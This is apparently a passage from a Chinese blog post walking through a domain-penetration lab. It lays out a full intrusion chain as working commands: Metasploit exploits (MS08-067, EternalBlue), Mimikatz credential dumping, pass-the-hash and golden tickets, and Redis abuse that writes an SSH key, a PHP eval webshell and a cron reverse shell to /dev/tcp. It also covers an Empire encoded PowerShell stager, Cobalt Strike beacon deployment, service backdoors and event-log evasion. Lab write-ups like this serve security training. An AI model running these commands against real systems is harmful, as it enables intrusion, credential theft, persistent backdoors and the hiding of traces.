+<p><img src="https://i.loli.net/2020/03/19/J6ygdKAuNR8ChPS.png" alt="Snipaste_2020-03-18_23-05-32.png"></p>
+<p>proxychains启动msfconsole</p>
+<p><strong>不设置 payload，攻陷后直接获得靶机1的cmd而不是meterpreter</strong></p>
+<p><strong>注意下如果前面用了反向代理，这里payload需要用正向</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ms08-067</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/C4PoDbMLKjGtJBV.png" alt="Snipaste_2020-03-18_23-15-56.png"></p>
+<p>发现不太稳定，进程迁移也是一样</p>
+<h4><span id="mimikatz插件">mimikatz插件</span></h4><p>通过mimikatz插件可以查看主机所在域，以及密码收集 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">mimikatz_command -f system::computer</span><br><span class="line">mimikatz_command -f samdump::hashes</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">wdigest</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/OWXahsiTGKwpJ3B.png" alt="Snipaste_2020-03-18_23-24-08.png"></p>
+<p>没有成功抓到</p>
+<h4><span id="内网攻击姿势-smb远程桌面口令猜测">内网攻击姿势-SMB远程桌面口令猜测</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search smb_login</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/pRToqPDOyXnkax3.png" alt="Snipaste_2020-03-18_23-29-45.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</span><br><span class="line">msf exploit (smb_login)&gt;set rhosts 192.168.127.235</span><br><span class="line">msf exploit (smb_login)&gt;set user_file &#x2F;root&#x2F;Pentest&#x2F;user.txt</span><br><span class="line">msf exploit (smb_login)&gt;set pass_file &#x2F;root&#x2F;Pentest&#x2F;pass.txt</span><br><span class="line">msf exploit (smb_login)&gt;set stop_on_success true</span><br><span class="line">msf exploit (smb_login)&gt;exploit</span><br></pre></td></tr></table></figure>
+
+<h4><span id="内网攻击姿势-oracle数据库-tns服务漏洞">内网攻击姿势-Oracle数据库   TNS服务漏洞</span></h4><blockquote>
+<p>oracle TNS Listener远程投毒（CVE-2012-1675） </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;oracle&#x2F;tnspoison_checker</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>TNS上的缓冲区漏洞（CVE-2009-1979） </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;oracle&#x2F;tns_auth_sesskey</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>CVE-2002-0965<br>MSF中漏洞利用模块</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;oracle&#x2F;tns_service_name</span><br></pre></td></tr></table></figure>
+
+<h4><span id="内网攻击姿势-rpc-dcom服务漏洞">内网攻击姿势-RPC DCOM服务漏洞</span></h4><blockquote>
+<p>微软修改dcerpc框架后形成自己的RPC框架来处理进程间的通信。微软的RPC框架在处理TCP/IP信息交换过程中存在的畸形消息时，未正确处理，导致缓冲区溢出漏洞；此漏洞影响使用RPC框架的DCOM接口，DCOM接口用来处理客户端机器发送给服务器的DCOM对象激活请求，如UNC路径。 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms03_026</span><br><span class="line">use exploit&#x2F;windows&#x2F;dcerpc&#x2F;ms03_026_dcom</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/VIUme12QJ9iwu37.png" alt="Snipaste_2020-03-19_00-07-14.png"></p>
+<p>没成功</p>
+<h4><span id="内网攻击姿势-ms17-010">内网攻击姿势- MS17-010</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/AjX4vGDTqiWcS3d.png" alt="Snipaste_2020-03-19_00-11-27.png"></p>
+<p>没成功，可能是由于前面打了一些别的payload</p>
+<h4><span id="钓鱼攻击">钓鱼攻击</span></h4><p>这个之前还真没搞过</p>
+<p><strong>快捷方式</strong></p>
+<p><img src="https://i.loli.net/2020/03/19/Fi61q3obDvgjhTz.png" alt="Snipaste_2020-03-19_00-16-42.png"></p>
+<p><strong>钓鱼链接</strong></p>
+<p><img src="https://i.loli.net/2020/03/19/NTBkUoMCVv46Yz8.png" alt="Snipaste_2020-03-19_00-20-29.png"></p>
+<p>但是下载完成之后还需要运行，因此需要一定的伪装技巧，比如<code>Clone Site</code></p>
+<p><img src="https://i.loli.net/2020/03/19/TpJ4GYk1VogFtEu.png" alt="Snipaste_2020-03-19_00-32-19.png"></p>
+<p><img src="https://i.loli.net/2020/03/19/LAHuh1Rft2ibXdn.png" alt="Snipaste_2020-03-19_00-33-10.png"></p>
+<p>ok，上半部分至此就结束了</p>
+<hr>
+<h4><span id="内网其他主机端口-redis-getshell">内网其他主机端口-redis Getshell</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/BPwkFgp8lA1VSMC.png" alt="Snipaste_2020-03-19_09-15-35.png"></p>
+<p><strong>①通过写SSH key的方式进行getshell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">生成密钥对</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">将生成的公钥写入到文件中</span><br><span class="line">(echo -e &quot;\n\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n\n&quot;) &gt; pub.txt</span><br><span class="line">设置路径、文件、写入公钥 </span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">exit</span><br><span class="line">连接</span><br><span class="line">ssh -i id_rsa root@192.168.2.155</span><br></pre></td></tr></table></figure>
+
+<p><strong>②向Web目录中写webshell的方式进行getshell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushdb</span><br><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">config set dbfilename &quot;gaia.php&quot;</span><br><span class="line">set gaia &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p>③redis写定时任务反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.155&#x2F;2333 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><strong>内网其他主机端口-Mysql提权</strong></p>
+<blockquote>
+<p><strong>1.UDF提权</strong><br>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。<br><strong>2.MOF提权</strong><br>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 </p>
+</blockquote>
+<p>sqlmap一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d &quot;mysql:&#x2F;&#x2F;root:123456@node3.buuoj.cn:26002&#x2F;mysql&quot; --os-shell</span><br></pre></td></tr></table></figure>
+
+<h4><span id="pth">PTH</span></h4><blockquote>
+<p>pass-the-hash，在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)，分为LM hash和NT hash，如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br>这类攻击适用于：域/工作组环境，可以获得hash，但是条件不允许对hash爆破，内网中存在和当前机器相同的密码，从windows到windows横向pth这一类攻击方法比较广泛 </p>
+</blockquote>
+<p>上传一个mimkatz</p>
+<p>利用之前logonpasswords得到的hash</p>
+<p><img src="https://i.loli.net/2020/03/19/ANQhVrcnSJLXevb.png" alt="Snipaste_2020-03-19_09-48-22.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege:debug </span><br><span class="line">sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:god.org &#x2F;ntlm:8601a88798be6a3948fce638a5790741</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/mMTCH92OwlcK13a.png" alt="Snipaste_2020-03-19_09-54-50.png"></p>
+<p>这时候就可以就ipc连接了</p>
+<p><img src="https://i.loli.net/2020/03/19/WAl1Og3ztnEpQU4.png" alt="Snipaste_2020-03-19_10-00-40.png"></p>
+<h4><span id="域渗透-横向移动wmi利用">域渗透-横向移动[wmi利用]</span></h4><blockquote>
+<p>WMI是一个系统插件,用于在本地远程管理计算机的进程,服务,注册表等其它的一系列的特权操作</p>
+</blockquote>
+<p>使用msf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;wmi</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set SMBPass vulstack@1</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set SMBDomain god.org</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/Vnha5IP7gGxtW4L.png" alt="Snipaste_2020-03-19_10-32-02.png"></p>
+<p>失败了，或者使用wmiexec</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binaries</span><br><span class="line">python setup.py install</span><br><span class="line">cd examples</span><br><span class="line"></span><br><span class="line">proxychains python wmiexec.py -debug &#39;administrator:vulstack@1@192.168.52.138&#39;</span><br><span class="line"></span><br><span class="line">proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:8601a88798be6a3948fce638a5790741 &#39;administrator@192.168.52.138&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/qap6TRv2u3egkIy.png" alt="Snipaste_2020-03-19_10-39-49.png"></p>
+<blockquote>
+<p>或者这个：<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a> </p>
+</blockquote>
+<p>先上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Moudle .\Invoke-TheHash.psd1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target 192.168.52.138 -Domain workgroup -Username administrator -Hash 8601a88798be6a3948fce638a5790741 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure>
+
+<p>这个得得到一个ps的shell</p>
+<p>这里使用Empire</p>
+<blockquote>
+<p><a href="https://github.com/BC-SECURITY/Empire" target="_blank" rel="noopener">https://github.com/BC-SECURITY/Empire</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uselistener http</span><br><span class="line">set Port 8080</span><br><span class="line">set Name test</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">back</span><br><span class="line">list</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usestager（空格+tab）</span><br><span class="line">usestager windows&#x2F;launcher_bat</span><br><span class="line">info</span><br><span class="line">set Listener test</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>生成<code>launcher.bat</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">start &#x2F;b powershell -noP -sta -w 1 -enc  WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAAZQAoACcAUwB5AHM...</span><br><span class="line">start &#x2F;b &quot;&quot; cmd &#x2F;c del &quot;%~f0&quot;&amp;exit &#x2F;b</span><br></pre></td></tr></table></figure>
+
+<p>收到了请求，但是没有agents</p>
+<p><img src="https://i.loli.net/2020/03/19/MvqNpYed1VQc4EZ.png" alt="Snipaste_2020-03-19_12-51-24.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usestager launcher_vbs test</span><br><span class="line">set Listener test</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>没成功</p>
+<h4><span id="内网其它主机端口-代理转发">内网其它主机端口-代理转发</span></h4><p>我主要是通过ew</p>
+<h4><span id="frp内网穿透">Frp内网穿透</span></h4><p>把自己的kali放到公网上，参考之前的文章</p>
+<blockquote>
+<p><a href="https://glotozz.github.io/2020/03/13/FRP搭建/">https://glotozz.github.io/2020/03/13/FRP%E6%90%AD%E5%BB%BA/</a> </p>
+</blockquote>
+<h4><span id="cs上线内网主机">CS上线内网主机</span></h4><p>proxychains启动cs，并执行</p>
+<p><img src="https://i.loli.net/2020/03/19/wZIaHGjd8pVDeQC.png" alt="Snipaste_2020-03-19_13-35-36.png"></p>
+<p>生成<code>beacon.exe</code></p>
+<p>利用ipc上传或者smbclient上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy beacon.exe \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient &#x2F;&#x2F;192.168.52.138&#x2F;c$ -U administrator</span><br><span class="line">put &#x2F;tmp&#x2F;beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/jTYhWOJ8snxPUCB.png" alt="Snipaste_2020-03-19_13-15-46.png"></p>
+<p>利用wmi执行</p>
+<p>成功上线</p>
+<p><img src="https://i.loli.net/2020/03/19/YjWQnHCLaZiyPJo.png" alt="Snipaste_2020-03-19_13-34-21.png"></p>
+<h4><span id="ssh隧道">SSH隧道</span></h4><blockquote>
+<p>这种代理方式需要比较高的权限(system/root)直接使用系统功能来开启内网代理的隧道，通过SSH隧道进行代理 </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -L port:host:hostport -l user remote_ip   #正向隧道，监听本地port</span><br><span class="line">ssh -qTfnN -R port:host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</span><br><span class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</span><br></pre></td></tr></table></figure>
+
+<h4><span id="持久控制">持久控制</span></h4><p><strong>域成员信息收集</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrator &#x2F;domain</span><br><span class="line">net group &#x2F;domain</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain</span><br><span class="line">net user &#x2F;domain</span><br><span class="line">dsquery user</span><br><span class="line">net accounts &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/lqJtyzNgVSHnrKv.png" alt="Snipaste_2020-03-19_13-54-31.png"></p>
+<p>利用SPN快速扫描域内存活相关服务以及快速定位服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T OWA-god.god.org -Q *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/DWRplrbfLQHNC3A.png" alt="Snipaste_2020-03-19_13-56-35.png"></p>
+<h4><span id="http-listener交互信息隐藏">HTTP Listener交互信息隐藏</span></h4><blockquote>
+<p><strong>1.</strong>将Cobalt Strike配置文件转换为功能性的mod_rewrite .htaccess或Nginx配置文件，以支持将HTTP反向代理重定向到Cobalt Strike团队服务器。使用反向代理可以保护后端C2服务器免受分析，调查和一般Internet背景辐射。<br><a href="https://github.com/threatexpress/cs2modrewrite" target="_blank" rel="noopener">https://github.com/threatexpress/cs2modrewrite</a><br><strong>2.</strong>Cobalt Strike通过Malleable C2配置文件修改其流量。配置文件提供了高度可定制的选项，用于修改服务器的C2流量在线路上的形式。Malleable C2配置文件可增加强事件响应的规避，使用的合法内部应用程序冒充已知对手或伪装目标。<br><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles</a> </p>
+</blockquote>
+<h4><span id="ssp">SSP</span></h4><blockquote>
+<p><strong>1.</strong>SSP，用于扩展Windows身份验证机制。LSASS进程正在Windows启动期间加载安全支持提供程序DLL。这种行为使红队的攻击者可以删除一个任意的SSP DLL以便与LSASS进程进行交互并记录该进程中存储的所有密码，或者直接用恶意的SSP对该进程进行修补。</p>
+</blockquote>
+<p><strong>2.</strong>项目Mimikatz提供了一个DLL文件（mimilib.dll），可以将其放到与LSASS进程（System32）相同的位置，以便为访问受感染主机的任何用户获得纯文本凭据。Mimikatz通过向LSASS注入新的SSP来支持内存技术选项。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="金票利用">金票利用</span></h4><blockquote>
+<p>krbtgt账户：每个域控制器都有一个“krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）加密的密钥。<br>黄金票据（Golden Ticket）：使在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。 </p>
+</blockquote>
+<p>获取金票需要的<code>ntml</code>和<code>sid</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz# LsaDump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csv</span><br><span class="line">whoami &#x2F;user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/XiVKcQwBG9aSu5l.png" alt="Snipaste_2020-03-19_14-06-25.png"></p>
+<p><img src="https://i.loli.net/2020/03/19/YxgwVjMcstXImzW.png" alt="Snipaste_2020-03-19_14-06-46.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:test.lab &#x2F;sid:S-1-5-21-2952760202-1353902439-2381784089-500 &#x2F;krbtgt:58e91a5ac358d86513ab224312314061 &#x2F;user:god &#x2F;ticket:gold2.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/26hOFXJSwnoZDju.png" alt="Snipaste_2020-03-19_14-09-53.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt gold2.kirbi #导入票据</span><br><span class="line">kerberos::list #列出票据</span><br><span class="line">kerberos::purge # 清除票据</span><br></pre></td></tr></table></figure>
+
+
+
+<h4><span id="后门植入">后门植入</span></h4><p><strong>使用persistence启动项后门</strong><br>在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p>
+<p><strong>metsvc服务后门</strong></p>
+<p>在<code>C:\Users***\AppData\Local\Temp\</code>上传了三个文件<code>（metsrv.x86.dll、metsvc-server.exe、metsvc.exe）</code>，通过服务启动，服务名为meterpreter </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/qtbUKTnRW9AkNgS.png" alt="Snipaste_2020-03-19_14-14-10.png"></p>
+<p>连接后门，<code>set payload windows/metsvc_bind_tcp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;metsvc_bind_tcp</span><br><span class="line">set rhost 192.168.1.133</span><br><span class="line">set lport 31337</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/03/19/PDzcH9N8qbVeQGn.png" alt="Snipaste_2020-03-19_14-19-35.png"></p>
+<p>重新进入session即可</p>
+<h4><span id="痕迹清理">痕迹清理</span></h4><blockquote>
+<p><a href="https://github.com/3gstudent/Windows-EventLog-Bypass" target="_blank" rel="noopener">https://github.com/3gstudent/Windows-EventLog-Bypass</a> </p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Invoke-Phant0m</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4><span id="总结">总结</span></h4><p>还需要学习Empire，后门数据传输的加密，免杀的制作，以及真实环境中如何快速高效的制定计划。</p>
+<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nAGjUsre2Hg_IkCPXLxYDQ</a> </p>
+<p> <a href="https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QLoXt5JTjHreUkZIg1uW3g</a></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 域渗透</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/16/awd-1/">
+        <span class="next-text nav-default">awd-1</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
